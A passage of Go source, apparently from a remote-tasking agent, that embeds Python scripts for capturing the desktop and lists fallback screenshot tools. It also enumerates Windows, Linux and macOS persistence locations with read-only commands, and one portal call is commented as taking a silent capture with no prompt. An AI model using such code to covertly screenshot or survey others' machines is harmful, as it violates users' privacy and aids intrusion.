rgb=bytearray(w*h*3);rgb[0::3]=px[2::4];rgb[1::3]=px[1::4];rgb[2::3]=px[0::4]
rows=bytearray()
for y in range(h):rows.append(0);rows+=rgb[y*w*3:(y+1)*w*3]
cz=zlib.compress(bytes(rows),6)
def ck(t,b):return struct.pack('>I',len(b))+t+b+struct.pack('>I',zlib.crc32(t+b)&0xFFFFFFFF)
with open(sys.argv[1],'wb') as f:f.write(b'\x89PNG\r\n\x1a\n'+ck(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))+ck(b'IDAT',cz)+ck(b'IEND',b''))
`

// python3PortalScreenshot captures the full desktop via the XDG Desktop Portal
// Screenshot interface using python3-gi (ships with the default Ubuntu GNOME
// desktop). Works on GNOME 45+ Wayland where unsafe-mode and XGetImage are gone.
// interactive=false takes a silent full-screen capture with no UI prompt.
const python3PortalScreenshot = `import gi,sys,shutil
gi.require_version('Gio','2.0')
from gi.repository import Gio,GLib
bus=Gio.bus_get_sync(Gio.BusType.SESSION,None)
loop=GLib.MainLoop()
r=[None]
def cb(c,se,pa,i,si,ps):
 if si=='Response':
  rv,rs=ps.unpack()
  if rv==0 and 'uri' in rs:r[0]=rs['uri']
  loop.quit()
snd=bus.get_unique_name().replace(':','').replace('.','_')
tok='sable1'
hdl='/org/freedesktop/portal/desktop/request/'+snd+'/'+tok
bus.signal_subscribe(None,None,'Response',hdl,None,Gio.DBusSignalFlags.NONE,cb)
pt=Gio.DBusProxy.new_sync(bus,Gio.DBusProxyFlags.NONE,None,'org.freedesktop.portal.Desktop','/org/freedesktop/portal/desktop','org.freedesktop.portal.Screenshot',None)
pt.call_sync('Screenshot',GLib.Variant('(sa{sv})',('',{'handle_token':GLib.Variant('s',tok),'interactive':GLib.Variant('b',False)})),0,-1,None)
GLib.timeout_add_seconds(15,loop.quit)
loop.run()
if r[0]:
 s=r[0][7:]if r[0].startswith('file://')else r[0]
 shutil.copy(s,sys.argv[1])
 sys.exit(0)
sys.exit(1)
`

func linuxScreenshotCandidates(base string) [][]string {
	jpg := base + ".jpg"
	png := base + ".png"
	return [][]string{
		{"gnome-screenshot", "-f", png},
		{"grim", png},
		{"scrot", jpg},
		{"maim", png},
		{"python3", "-c", python3X11Screenshot, png},
		{"import", "-window", "root", png},
		{"xfce4-screenshooter", "-f", "-s", png},
		{"mate-screenshot", "-f", png},
		{"spectacle", "-b", "-n", "-o", png},
		{"flameshot", "full", "-p", png},
	}
}

func detectPersistence() (string, string) {
	var b strings.Builder
	fmt.Fprintf(&b, "Common persistence locations for %s/%s\n", runtime.GOOS, runtime.GOARCH)
	fmt.Fprintf(&b, "Collected read-only at %s\n", time.Now().Format(time.RFC3339))

	switch runtime.GOOS {
	case "windows":
		appendWindowsPersistence(&b)
	case "darwin":
		appendDarwinPersistence(&b)
	default:
		appendLinuxPersistence(&b)
	}

	text := b.String()
	if len(text) > maxSituationalOutputBytes {
		text = text[:maxSituationalOutputBytes] + fmt.Sprintf("\n[output truncated at %d bytes]", maxSituationalOutputBytes)
	}
	return strings.TrimRight(text, "\r\n"), ""
}

func appendWindowsPersistence(b *strings.Builder) {
	keys := []string{
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		`HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`,
		`HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		`HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`,
	}
	for _, key := range keys {
		appendCommandSection(b, "Registry "+key, "reg.exe", "query", key)
	}

	appendPathSection(b, "Current user startup folder", filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`))
	appendPathSection(b, "All users startup folder", filepath.Join(os.Getenv("ProgramData"), `Microsoft\Windows\Start Menu\Programs\Startup`))
	appendCommandSection(b, "Enabled scheduled tasks", "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", `Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Select-Object TaskPath,TaskName,State | Format-Table -AutoSize | Out-String -Width 220`)
	appendCommandSection(b, "Auto-start services", "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", `Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq 'Auto'} | Select-Object Name,State,StartName,PathName | Format-Table -AutoSize | Out-String -Width 220`)
}

func appendLinuxPersistence(b *strings.Builder) {
	home, _ := os.UserHomeDir()
	paths := []struct {
		title string
		path  string
	}{
		{"Systemd system units", "/etc/systemd/system"},
		{"Systemd user units", filepath.Join(home, ".config/systemd/user")},
		{"Cron.d", "/etc/cron.d"},
		{"Cron hourly", "/etc/cron.hourly"},
		{"Cron daily", "/etc/cron.daily"},
		{"Init.d", "/etc/init.d"},
		{"XDG autostart", "/etc/xdg/autostart"},
		{"User autostart", filepath.Join(home, ".config/autostart")},
		{"rc.local", "/etc/rc.local"},
	}
	for _, p := range paths {
		appendPathSection(b, p.title, p.path)
	}
	appendCommandSection(b, "Current user crontab", "crontab", "-l")
	appendCommandSection(b, "Enabled systemd services", "systemctl", "list-unit-files", "--type=service", "--state=enabled", "--no-pager", "--no-legend")
	appendCommandSection(b, "Enabled systemd timers", "systemctl", "list-unit-files", "--type=timer", "--state=enabled", "--no-pager", "--no-legend")
}

func appendDarwinPersistence(b *strings.Builder) {
	home, _ := os.UserHomeDir()
	paths := []struct {
		title string
		path  string
	}{
		{"System LaunchAgents", "/Library/LaunchAgents"},
		{"System LaunchDaemons", "/Library/LaunchDaemons"},
		{"User LaunchAgents", filepath.Join(home, "Library/LaunchAgents")},
		{"Global StartupItems", "/Library/StartupItems"},
		{"User Login Items plist", filepath.Join(home, "Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm")},
	}
	for _, p := range paths {
		appendPathSection(b, p.title, p.path)
	}
	appendCommandSection(b, "Current user crontab", "crontab", "-l")
}

func appendCommandSection(b *strings.Builder, title, name string, args ...string) {
	out, taskErr := runReadOnlyCommand(situationalTimeout, name, args...)
	fmt.Fprintf(b, "\n== %s ==\n", title)
	if strings.TrimSpace(out) != "" {
		fmt.Fprintf(b, "%s\n", strings.TrimRight(out, "\r\n"))
	}
	if taskErr != "" {
		fmt.Fprintf(b, "[%s]\n", taskErr)
	}
	if strings.TrimSpace(out) == "" && taskErr == "" {
		fmt.Fprintln(b, "(no entries)")
	}
}

func appendPathSection(b *strings.Builder, title, path string) {
	fmt.Fprintf(b, "\n== %s ==\n%s\n", title, path)
	if strings.TrimSpace(path) == "" {
		fmt.Fprintln(b, "(path unavailable)")
		return
	}
	info, err := os.Stat(path)
	if err != nil {
		fmt.Fprintf(b, "[%s]\n", err)
		return
	}
	if !info.IsDir() {
		fmt.Fprintf(b, "file exists (%d bytes)\n", info.Size())
		return
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		fmt.Fprintf(b, "[%s]\n", err)
		return
	}
	if len(entries) == 0 {
		fmt.Fprintln(b, "(empty)")
		return
	}
	names := make([]string, 0, len(entries))
	for _, entry := range entries {
		name := entry.Name()
		if entry.IsDir() {
			name += string(os.PathSeparator)
		}
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		fmt.Fprintf(b, "%s\n", name)
	}
}
